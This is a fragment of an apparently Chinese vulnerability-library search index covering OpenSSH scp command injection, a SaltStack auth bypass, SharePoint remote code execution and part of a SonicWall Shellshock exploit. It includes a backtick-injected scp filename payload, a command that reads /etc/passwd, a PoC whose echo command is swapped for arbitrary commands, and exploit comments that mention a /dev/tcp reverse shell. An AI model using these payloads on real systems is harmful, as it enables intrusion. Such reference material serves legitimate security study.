url.txt\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/","title":"OpenSSH\u547d\u4ee4\u6ce8\u5165CVE-2020-15778","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_1","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>OpenSSH\uff08OpenBSD Secure Shell\uff09\u662fOpenBSD\u8ba1\u5212\u7ec4\u7684\u4e00\u5957\u7528\u4e8e\u5b89\u5168\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8fde\u63a5\u5de5\u5177\u3002\u8be5\u5de5\u5177\u662fSSH\u534f\u8bae\u7684\u5f00\u6e90\u5b9e\u73b0\uff0c\u652f\u6301\u5bf9\u6240\u6709\u7684\u4f20\u8f93\u8fdb\u884c\u52a0\u5bc6\uff0c\u53ef\u6709\u6548\u963b\u6b62\u7a83\u542c\u3001\u8fde\u63a5\u52ab\u6301\u4ee5\u53ca\u5176\u4ed6\u7f51\u7edc\u7ea7\u7684\u653b\u51fb\u3002 OpenSSH 8.3p1\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684scp\u7684scp.c\u6587\u4ef6\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u5916\u90e8\u8f93\u5165\u6570\u636e\u6784\u9020\u64cd\u4f5c\u7cfb\u7edf\u53ef\u6267\u884c\u547d\u4ee4\u8fc7\u7a0b\u4e2d\uff0c\u7f51\u7edc\u7cfb\u7edf\u6216\u4ea7\u54c1\u672a\u6b63\u786e\u8fc7\u6ee4\u5176\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u3001\u547d\u4ee4\u7b49\u3002\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u975e\u6cd5\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>\u6f0f\u6d1e\u89e6\u53d1\u70b9\u5982\u4e0b\uff0c\u5f53\u6587\u4ef6\u590d\u5236\u5230\u8fdc\u7a0bSSH\u670d\u52a1\u5668\u65f6\uff0c\u6587\u4ef6\u8def\u5f84\u4f1a\u9644\u52a0\u5728\u672c\u5730scp\u547d\u4ee4\u7684\u672b\u5c3e\uff1a </p> <p>\u6bd4\u5982\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u65f6 scp source_file user@host: directory/destination_file</p> <p>\u5728SSH\u670d\u52a1\u5668\u7684\u672c\u5730\u5c06\u4f1a\u6267\u884c\uff1a scp -t directory/destination_file</p> <p>\u540c\u65f6\uff0c\u5728\u521b\u5efa\u672c\u5730scp\u547d\u4ee4\u65f6\uff0c\u672a\u6e05\u7406\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u53cd\u5f15\u53f7\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\uff0c\u800clinux\u7cfb\u7edf\u5141\u8bb8\u4ee5\u53cd\u5f15\u53f7\u8fdb\u884c\u6587\u4ef6\u547d\u540d\u3002\u6240\u4ee5\u5982\u679c\u628apayload\u5199\u5165\u5728\u53cd\u5f15\u53f7\u4e2d\u4f5c\u4e3a\u6587\u4ef6\u540d\uff0c\u5f53\u8c03\u7528scp\u547d\u4ee4\u65f6\u5c31\u4f1a\u89e6\u53d1payload\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_3","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>OpenSSH &lt;=8.3p1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>payload\uff1ascp /source_file user@ip:'<code>touch /tmp/wow.sh</code>/destination_file ' </p> <p>\u767b\u5f55\u5230SSH\u670d\u52a1\u5668\uff0c\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6267\u884c\u547d\u4ee4\u521b\u5efa\u4e86\u6587\u4ef6\uff1a </p> <p>\u8be5\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6\u8f83\u4e3a\u4e25\u683c\uff0c\u9700\u8981\u83b7\u53d6SSH\u670d\u52a1\u5668\u7684\u5bc6\u7801\u624d\u80fd\u8fdb\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u4f46\u662f\u5728\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u4e5f\u53ef\u53d1\u6325\u5927\u7528\u5904\uff0c\u6bd4\u5982SSH\u7aef\u53e3\u88ab\u9650\u5236\u8bbf\u95ee\uff0c\u5219\u53ef\u901a\u8fc7\u8be5\u6f0f\u6d1e\u7684\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u83b7\u53d6\u65b0\u6743\u9650\u3002</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SSH/OpenSSH%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5CVE-2020-15778/#_5","title":"\u4fee\u590d\u5efa\u8bae","text":"<p>\uff081\uff09\u5173\u6ce8\u5382\u5546\u7684\u5b89\u5168\u901a\u544a\u548c\u8865\u4e01\u53d1\u5e03\uff1ahttp://www.openssh.com/portable.html \uff082\uff09\u7981\u7528scp -r\u62f7\u8d1d\u76ee\u5f55\u7684\u65b9\u5f0f</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/","title":"SaltStack\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e CVE 2020 11651","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x01","title":"0x01 \u7b80\u4ecb","text":"<p>SaltStack \u662f\u57fa\u4e8e Python \u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x02","title":"0x02 \u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u5728 CVE-2020-11651 \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u7ed5\u8fc7 Salt Master \u7684\u9a8c\u8bc1\u903b\u8f91\uff0c\u8c03\u7528\u76f8\u5173\u672a\u6388\u6743\u51fd\u6570\u529f\u80fd\uff0c\u4ece\u800c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a</p> <p>ClearFuncs\u7c7b\u4f1a\u5904\u7406\u975e\u8ba4\u8bc1\u7684\u8bf7\u6c42\u548c\u66b4\u9732_send_pub()\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u6765\u76f4\u63a5\u5728master publish\u670d\u52a1\u5668\u4e0a\u5bf9\u6d88\u606f\u8fdb\u884c\u6392\u961f\u3002\u8fd9\u4e9b\u6d88\u606f\u53ef\u4ee5\u7528\u6765\u89e6\u53d1minion\u6765\u4ee5root\u6743\u9650\u8fd0\u884c\u4efb\u610f\u547d\u4ee4\u3002</p> <p>ClearFuncs\u7c7b\u8fd8\u4f1a\u66b4\u9732  _prep_auth_info()\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u8fd4\u56de\u7528\u6765\u8ba4\u8bc1master\u670d\u52a1\u5668\u4e0a\u672c\u5730root\u7528\u6237\u7684\u547d\u4ee4\u7684root key\u3002\u7136\u540eroot  key\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u8c03\u7528master \u670d\u52a1\u5668\u7684\u7ba1\u7406\u547d\u4ee4\u3002\u8fd9\u79cd\u65e0\u610f\u7684\u66b4\u9732\u63d0\u4f9b\u7ed9\u8fdc\u7a0b\u975e\u8ba4\u8bc1\u7684\u653b\u51fb\u8005\u5bf9salt  master\u7684\u4e0eroot\u6743\u9650\u7b49\u4ef7\u7684\u8bbf\u95ee\u6743\u9650\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x03","title":"0x03 \u5f71\u54cd\u7248\u672c","text":"<p>\uf06c   SaltStack &lt; 2019.2.4  \uf06c  SaltStack &lt; 3000.2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x04","title":"0x04 \u73af\u5883\u642d\u5efa","text":"<p>\u76f4\u63a5\u4f7f\u7528vulhub\u8fdb\u884c\u642d\u5efa  git clone https://github.com/vulhub/vulhub.git  cd /vulhub/saltstack/CVE-2020-11651/  docker-compose up -d  </p> <p>\u67e5\u770b\u73af\u5883\u662f\u5426\u542f\u52a8docker ps  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SaltStack/SaltStack%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2020-11651/#0x05","title":"0x05 \u6f0f\u6d1e\u590d\u73b0","text":"<p>Poc\uff1a  https://github.com/jasperla/CVE-2020-11651-poc </p> <p>\u6267\u884c\u524d\u9700\u8981\u5b89\u88c5salt\u5e93\uff0c\u9700\u6307\u5b9asalt\u5e93\u7248\u672c</p> <p>pip3 install salt==2019.2.3  </p> <p>\u9776\u673aip\uff1a192.168.10.113  \u653b\u51fb\u673aip\uff1a192.168.10.113</p> <p>\u8bfb\u53d6\u6587\u4ef6\uff1a  python3 exploit.py --master 192.168.232.170 -r /etc/passwd</p> <p></p> <p>0x06 \u4fee\u590d\u65b9\u5f0f</p> <p>1\u3001SaltStack\u5b98\u65b9\u5df2\u53d1\u5e03\u6700\u65b0\u7248\u672c\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u5efa\u8bae\u76f8\u5173\u7528\u6237\u53ca\u65f6\u66f4\u65b0\u81f3\u5b89\u5168\u7248\u672c\u53ca\u5176\u4ee5\u4e0a\uff0c\u5e76\u5f00\u542fSaltStack\u81ea\u52a8\u66f4\u65b0\uff0c\u4ee5\u4fbf\u5b9e\u65f6\u83b7\u53d6\u8865\u4e01\u6216\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\uff1ahttps://repo.saltstack.com/  2\u3001\u7981\u6b62\u5c06Salt Master\u9ed8\u8ba4\u76d1\u542c\u7aef\u53e3\uff084505\u30014506\uff09\u5411\u516c\u7f51\u5f00\u653e\uff0c\u5e76\u8bbe\u7f6e\u4e3a\u4ec5\u5bf9\u53ef\u4fe1\u5bf9\u8c61\u5f00\u653e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"CVE-2020-1181 SharePoint\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-19 15:39:29</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u63cf\u8ff0","text":"<p>\u5fae\u8f6fSharePoint\u670d\u52a1\u5668\u5141\u8bb8\u7528\u6237\u521b\u5efaweb\u9875\u9762\uff0c\u4f46\u4e3a\u4e86\u907f\u514d\u88ab\u6ee5\u7528\uff0c\u670d\u52a1\u5668\u4f1a\u4e25\u683c\u9650\u5236\u8fd9\u4e9b\u9875\u9762\u4e0a\u80fd\u591f\u51fa\u73b0\u7684\u7ec4\u4ef6\u3002SharePoint\u670d\u52a1\u5668\u4f1a\u4ee5\u4e0d\u540c\u7684\u65b9\u5f0f\u6765\u5904\u7406\u201c\u81ea\u6709\u201d\u9875\u9762\u548c\u7528\u6237\u5b9a\u4e49\u7684\u9875\u9762\u3002SharePoint\u7684\u201c\u81ea\u6709\u201d\u9875\u9762\u5b58\u653e\u5728\u6587\u4ef6\u7cfb\u7edf\u4e0a\uff0c\u4e0d\u53d7\u4efb\u4f55\u9650\u5236\u3002\u7528\u6237\u9875\u9762\u5b58\u653e\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u53d7\u670d\u52a1\u5668\u7ea6\u675f\u3002\u5176\u4e2d\u6709\u4e9b\u9650\u5236\u6761\u4ef6\u5305\u62ec\u65e0\u6cd5\u4f7f\u7528\u4ee3\u7801\u5757\uff08code block\uff09\u3001\u65e0\u6cd5\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u3002\u7528\u6237\u9875\u9762\u901a\u5e38\u53ea\u80fd\u4f7f\u7528\u9884\u5b9a\u4e49\u5217\u8868\u4e2d\u5141\u8bb8\u7684web\u63a7\u4ef6\u3002</p> <p>\u5982\u679c\u7528\u6237\u901a\u8fc7\u4e0a\u4f20\u65b9\u5f0f\u521b\u5efa\u65b0\u9875\u9762\uff0c\u90a3\u4e48\u8be5\u9875\u9762\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\u3002\u7136\u800c\uff0c\u5982\u679c\u65b0\u9875\u9762\u901a\u8fc7SharePoint Web Editor\u521b\u5efa\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab\u5f53\u6210\u201cghost\u201d\u9875\u9762\uff0c\u540c\u6837\u662f\u53ef\u4fe1\u7684\u6e90\u3002\u8fd9\u4e2a\u903b\u8f91\u4e5f\u5f88\u6b63\u5e38\uff0c\u56e0\u4e3aSharePoint Web Editor\u4f1a\u9650\u5236\u80fd\u591f\u6dfb\u52a0\u5230\u9875\u9762\u7684\u5177\u4f53\u7ec4\u4ef6\uff0c\u56e0\u6b64\u9875\u9762\u53ef\u4ee5\u5728\u4e0d\u53d7\u9650\u5236\u7684\u6a21\u5f0f\u4e0b\u5b89\u5168\u8fd0\u884c\u3002</p> <p>Web Editor\u4e2d\u5141\u8bb8\u4e00\u79cdWeb Part\u7c7b\u578b\uff1aWikiContentWebpart\u3002\u8fd9\u79cdWeb Part\u5141\u8bb8\u5305\u542b\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u4e0d\u53d7\u9650\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610fASP.NET\u6807\u8bb0\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SharePoint/CVE-2020-1181%20SharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"POC","text":"<p>\u6f14\u793a\u573a\u666f\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u7248\u672c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u7684Microsoft SharePoint 2019 Server\uff0c\u5b89\u88c5\u5728Windows Server 2019 Datacenter\u7cfb\u7edf\u4e0a\u3002\u670d\u52a1\u5668\u4e3b\u673a\u540d\u4e3asp2019.contoso.lab\uff0c\u5df2\u52a0\u5165contoso.lab\u57df\u4e2d\uff0c\u57df\u63a7\u5236\u5668\u4e3a\u4e00\u53f0\u72ec\u7acb\u7684\u865a\u62df\u673a\u3002\u6211\u4eec\u7684\u76ee\u6807\u4e3b\u673a\u5df2\u5b89\u88c5\u622a\u81f32020\u5e742\u6708\u4efd\u7684\u6240\u6709\u8865\u4e01\uff0c\u56e0\u6b64\u5bf9\u5e94\u7684\u7248\u672c\u53f7\u4e3a16.0.10355.20000\u3002</p> <p>\u653b\u51fb\u7cfb\u7edf\u4e2d\u53ea\u9700\u8981\u4f7f\u7528\u652f\u6301\u7684web\u6d4f\u89c8\u5668\u5373\u53ef\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u6d4f\u89c8\u5668\u4e3aMozilla Firefox 69.0.3\u3002\u6211\u4eec\u8fd8\u4f1a\u4f7f\u7528\u4e0e\u524d\u6587\u7c7b\u4f3c\u7684WikiContentWebpart\uff0c\u5c06\u5176\u547d\u540d\u4e3aWikiContentRCE.xml\u3002</p> <p>\u9996\u5148\u6211\u4eec\u8bbf\u95eeSharePoint Server\uff0c\u4ee5\u666e\u901a\u7528\u6237\uff08user2\uff09\u901a\u8fc7\u8eab\u4efd\u8ba4\u8bc1\uff1a  </p> <p>\u63a5\u4e0b\u6765\u521b\u5efa\u7ad9\u70b9\uff0c\u4f7f\u8be5\u7528\u6237\u53d8\u6210\u8be5\u7ad9\u70b9\u6240\u6709\u8005\uff08owner\uff09\uff0c\u5177\u5907\u6240\u6709\u6743\u9650\u3002</p> <p>\u70b9\u51fb\u9876\u90e8\u9762\u677f\u7684\u201cSharePoint\u201d\u533a\u57df\uff1a </p> <p>\u7136\u540e\u70b9\u51fb\u201c+ Create site\u201d\u94fe\u63a5\uff1a</p> <p></p> <p>\u9009\u62e9\u201cTeam Site\u201d\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u4e3a\u65b0\u7ad9\u70b9\u8bbe\u7f6e\u540d\u79f0\uff0c\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3atestsiteofuser2\u3002</p> <p></p> <p>\u70b9\u51fb\u201cFinish\u201d\uff0c\u6210\u529f\u521b\u5efa\u65b0\u7ad9\u70b9\uff1a</p> <p></p> <p>\u73b0\u5728\u70b9\u51fb\u201cPages\u201d\u94fe\u63a5\uff1a</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u5207\u6362\u5230\u201cClassic View\u201d\uff0c\u70b9\u51fb\u5de6\u4e0b\u89d2\u7684\u201cReturn to classic SharePoint\u201d\u94fe\u63a5\u5373\u53ef\uff1a</p> <p></p> <p>\u70b9\u51fb\u201c+ New\u201d\uff0c\u4e3a\u65b0\u9875\u9762\u8bbe\u7f6e\u4e00\u4e2a\u540d\u79f0\u3002\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e\u4e3anewpage1\uff1a</p> <p></p> <p>\u70b9\u51fb\u201cCreate\u201d\u6309\u94ae\u786e\u8ba4 </p> <p>\u73b0\u5728\u6211\u4eec\u9700\u8981\u5728\u201cINSERT\u201d\u6807\u7b7e\u9875\u4e2d\u9009\u62e9\u201cWeb Part\u201d\uff1a </p> <p>\u5728\u5bf9\u8bdd\u6846\u7a97\u53e3\u4e2d\uff0c\u9009\u62e9\u5de6\u4e0b\u89d2\u7684\u201cUpload Web Part\u201d\u94fe\u63a5\uff0c\u4e0a\u4f20\u6211\u4eec\u6784\u9020\u7684WikiContentRCE.xml\u6587\u4ef6\uff1a </p> <p>\u70b9\u51fbUpload\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u770b\u5230\u4e00\u4e2a\u8b66\u544a\u5f39\u7a97\uff1a\u201c\u786e\u8ba4\u79bb\u5f00\u9875\u9762\uff1f\u60a8\u8f93\u5165\u7684\u6570\u636e\u53ef\u80fd\u4e0d\u4f1a\u88ab\u4fdd\u5b58\u201d\u3002\u6b64\u65f6\u70b9\u51fb\u201cLeave Page\u201d\u6309\u94ae\u5373\u53ef\uff0c\u8fd4\u56de\u4e3b\u7f16\u8f91\u89c6\u56fe\uff1a</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u518d\u6b21\u5728INSERT\u6807\u7b7e\u9875\u4e2d\u9009\u62e9Web Part\u5c0f\u90e8\u4ef6\uff0c\u5176\u4e2d\u5c06\u51fa\u73b0\u6211\u4eec\u5bfc\u5165\u7684Web Part\uff1a</p> <p></p> <p>\u5728\u70b9\u51fbAdd\u6309\u94ae\u4e4b\u524d\uff0c\u6211\u4eec\u5148\u8f6c\u5230\u76ee\u6807SharePoint\u670d\u52a1\u5668\uff0c\u6253\u5f00C:\\windows\\temp\u76ee\u5f55\uff1a</p> <p></p> <p>\u6b64\u65f6\u8be5\u76ee\u5f55\u4e2d\u4e0d\u5b58\u5728RCE_PoC.txt\u6587\u4ef6\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u8f6c\u5230\u653b\u51fb\u8005\u4e3b\u673a\uff0c\u5c06\u6211\u4eec\u5bfc\u5165\u7684Web Part\u6dfb\u52a0\u5230\u9875\u9762\u4e2d\uff1a</p> <p> \u518d\u6b21\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u68c0\u67e5C:\\windows\\temp\u76ee\u5f55\uff1a </p> <p>\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5165\u4fb5\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ea\u9700\u8981\u5728WikiContentRCE.xml\u6587\u4ef6\u4e2d\uff0c\u5c06echo pwned &gt; c:/windows/temp/RCE_PoC.txt\u5b57\u7b26\u4e32\u66ff\u6362\u6210\u6240\u9700\u7684\u547d\u4ee4\u5373\u53ef\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/","title":"!/usr/bin/python","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#coding-utf-8","title":"coding: utf-8","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#author-darren-martyn","title":"Author: Darren Martyn","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#credit-phineas-fisher","title":"Credit: Phineas Fisher","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#notes","title":"Notes:","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#this-exploit-basically-implements-the-exploits-phineas-fisher-used-to-pwn-hacking-team","title":"This exploit basically implements the exploits Phineas Fisher used to pwn Hacking Team","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#and-the-cayman-trust-bank-place-it-uses-the-shellshock-vulnerability-to-gain-a-command","title":"and the Cayman Trust Bank place. It uses the Shellshock vulnerability to gain a command","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#execution-primitive-as-the-nobody-user-in-the-cgi-binjarrewritesh-web-script-spawns","title":"execution primitive as the \"nobody\" user in the cgi-bin/jarrewrite.sh web-script, spawns","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#a-trivial-reverse-shell-using-devtcp","title":"a trivial reverse shell using /dev/tcp.","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#there-is-a-fairly-trivial-lpe-in-these-that-gets-you-root-by-abusing-setuid-dos2unix-but","title":"There is a fairly trivial LPE in these that gets you root by abusing setuid dos2unix, but","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#implementing-that-is-left-as-an-exercise-for-the-reader-ive-seen-a-few-approaches-and","title":"implementing that is left as an exercise for the reader. I've seen a few approaches, and","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#would-be-interested-in-seeing-yours","title":"would be interested in seeing yours.","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SonicWall%20SSL-VPN/SonicWall%20SSL-VPN%20%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E/#there-is-another-lpe-that-works-only-on-some-models-which-i-also-have-removed-from-this","title":"There is another LPE that works only on some models which I also have removed from 